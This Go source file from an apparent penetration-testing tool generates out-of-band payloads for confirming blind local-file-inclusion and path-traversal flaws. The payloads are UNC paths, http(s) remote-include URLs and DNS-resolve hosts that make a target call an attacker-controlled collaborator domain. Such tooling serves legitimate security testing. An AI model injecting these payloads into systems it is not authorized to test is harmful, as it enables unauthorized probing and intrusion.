// Package oob generates out-of-band (OOB) payloads for confirming blind LFI /
// path-traversal sinks — vulnerabilities where the target reads or includes a
// file but never reflects its contents in the HTTP response.
//
// Detection in exhumed is otherwise purely response-body pattern matching
// (internal/detect), so blind sinks are invisible. An OOB payload forces the
// target to make an outbound interaction (DNS lookup, SMB/HTTP fetch) to an
// attacker-controlled collaborator domain; observing that interaction proves the
// sink fired even when nothing comes back in the response.
//
// This package is a payload GENERATOR only. It performs no network I/O and runs
// no listener: it emits the strings an operator places into a vulnerable
// parameter, then correlates hits out-of-band using their own collaborator
// (interactsh, Burp Collaborator, a controlled DNS/HTTP log, etc.). The
// listener/correlation half is a deliberate follow-on; keeping generation pure
// preserves the static-binary, no-cgo, MIT-clean constraints in CLAUDE.md.
package oob

import (
	"fmt"
	"strings"
)

// Technique enumerates the OOB payload classes exhumed can generate.
type Technique string

const (
	// TechniqueSMB is a Windows UNC path (\\host\share). PHP include(),
	// many Java/.NET file APIs, and SMB-aware loaders dereference UNC paths,
	// causing an outbound SMB (and a preceding DNS) interaction to the
	// collaborator. The single most reliable blind-LFI primitive on Windows.
	TechniqueSMB Technique = "smb-unc"

	// TechniqueHTTP is an http:// remote-include wrapper. When allow_url_include
	// is on (PHP) or the sink fetches remote URLs, the target retrieves the
	// resource from the collaborator over HTTP — an unambiguous callback.
	TechniqueHTTP Technique = "http-wrapper"

	// TechniqueHTTPS is the https:// variant of the remote-include wrapper, for
	// sinks or egress filters that only permit TLS fetches.
	TechniqueHTTPS Technique = "https-wrapper"

	// TechniqueDNS embeds the collaborator domain in a path the target will try
	// to resolve (UNC hostname / remote wrapper host) purely for the DNS
	// lookup, the lowest-egress signal that survives strict outbound filtering
	// where only DNS leaves the network.
	TechniqueDNS Technique = "dns-resolve"
)

// Payload is a single generated OOB payload with the metadata an operator needs
// to recognise its interaction at the collaborator.
type Payload struct {
	// Value is the string to inject into the vulnerable parameter.
	Value string
	// Technique is the OOB class that produced Value.
	Technique Technique
	// Subdomain is the unique label prepended to the collaborator domain for
	// this payload, letting the operator attribute an observed interaction to a
	// specific technique. Empty when no label is prepended.
	Subdomain string
	// Note is a short human-readable description of what firing this payload
	// proves and the precondition it relies on.
	Note string
}

// Options configures payload generation.
type Options struct {
	// Domain is the operator's collaborator domain (e.g. an interactsh or Burp
	// Collaborator host). Required; must be a bare domain with no scheme, path,
	// or leading dot.
	Domain string
	// Share is the SMB share name appended after the host in UNC payloads.
	// Defaults to "exhumed" when empty.
	Share string
	// Path is the optional resource path appended to http(s):// wrapper
	// payloads (without a leading slash). Defaults to a marker path when empty.
	Path string
	// Label, when true, prepends a per-technique subdomain label to the
	// collaborator domain so interactions can be attributed by technique. Many
	// collaborators (interactsh) surface the full queried FQDN, making this the
	// preferred mode. SMB does not support a subdomain label on the UNC host in
	// all stacks, so the label is applied only to DNS/HTTP techniques.
	Label bool
}

// labelFor returns the technique-specific subdomain label used when
// Options.Label is set.
func labelFor(t Technique) string {
	switch t {
	case TechniqueSMB:
		return "smb"
	case TechniqueHTTP:
		return "http"
	case TechniqueHTTPS:
		return "https"
	case TechniqueDNS:
		return "dns"
	default:
		return "oob"
	}
}

// validateDomain rejects inputs that are not bare collaborator domains. A
// scheme, path, or wildcard would silently produce a malformed payload.
func validateDomain(d string) error {
	if d == "" {
		return fmt.Errorf("collaborator domain is required")
	}
	if strings.ContainsAny(d, " \t\r\n") {
		return fmt.Errorf("collaborator domain must not contain whitespace: %q", d)
	}
	if strings.Contains(d, "://") {
		return fmt.Errorf("collaborator domain must not include a scheme: %q", d)
	}
	if strings.ContainsAny(d, "/\\") {
		return fmt.Errorf("collaborator domain must not include a path: %q", d)
	}
	if strings.HasPrefix(d, ".") || strings.HasSuffix(d, ".") {
		return fmt.Errorf("collaborator domain must not start or end with a dot: %q", d)
	}
	if !strings.Contains(d, ".") {
		return fmt.Errorf("collaborator domain must be a fully-qualified domain: %q", d)
	}
	return nil
}

// host applies the per-technique label to the collaborator domain when
// labelling is enabled, returning the host and the label used (empty if none).
func (o Options) host(t Technique) (host, label string) {
	if o.Label {
		label = labelFor(t)
		return label + "." + o.Domain, label
	}
	return o.Domain, ""
}

// Generate returns an ordered slice of OOB payloads for opts, from most to
// least reliable (SMB → HTTP → HTTPS → DNS). It returns an error if opts.Domain
// is not a bare collaborator domain.
func Generate(opts Options) ([]Payload, error) {
	if err := validateDomain(opts.Domain); err != nil {
		return nil, err
	}

	share := opts.Share
	if share == "" {
		share = "exhumed"
	}
	if strings.ContainsAny(share, "\\/") {
		return nil, fmt.Errorf("share name must not contain slashes: %q", share)
	}

	path := opts.Path
	if path == "" {
		path = "exhumed-oob"
	}
	path = strings.TrimLeft(path, "/")

	var payloads []Payload

	// ── SMB UNC (Windows) ─────────────────────────────────────────────────────
	// SMB does not reliably carry a per-technique subdomain label on the UNC
	// host across all stacks, so the bare collaborator domain is always used
	// here; attribution for SMB relies on the SMB/DNS hit itself.
	payloads = append(payloads, Payload{
		Value:     `\\` + opts.Domain + `\` + share,
		Technique: TechniqueSMB,
		Subdomain: "",
		Note:      "UNC path; PHP include()/Java/.NET file APIs dereference it, triggering outbound SMB+DNS. Most reliable on Windows targets.",
	})

	// ── http:// remote-include wrapper ────────────────────────────────────────
	if h, lbl := opts.host(TechniqueHTTP); true {
		payloads = append(payloads, Payload{
			Value:     "http://" + h + "/" + path,
			Technique: TechniqueHTTP,
			Subdomain: lbl,
			Note:      "Remote-include wrapper; fires when allow_url_include is on or the sink fetches URLs. Produces an HTTP callback.",
		})
	}

	// ── https:// remote-include wrapper ───────────────────────────────────────
	if h, lbl := opts.host(TechniqueHTTPS); true {
		payloads = append(payloads, Payload{
			Value:     "https://" + h + "/" + path,
			Technique: TechniqueHTTPS,
			Subdomain: lbl,
			Note:      "TLS remote-include wrapper; use when egress only permits HTTPS fetches.",
		})
	}

	// ── DNS-only resolve ──────────────────────────────────────────────────────
	// A bare UNC host with no share forces a DNS resolution of the host even on
	// stacks that ultimately refuse the SMB connect — the lowest-egress signal.
	if h, lbl := opts.host(TechniqueDNS); true {
		payloads = append(payloads, Payload{
			Value:     `\\` + h + `\`,
			Technique: TechniqueDNS,
			Subdomain: lbl,
			Note:      "DNS-only; the host is resolved before any connect, so it survives strict egress filtering that blocks SMB/HTTP.",
		})
	}

	return payloads, nil
}
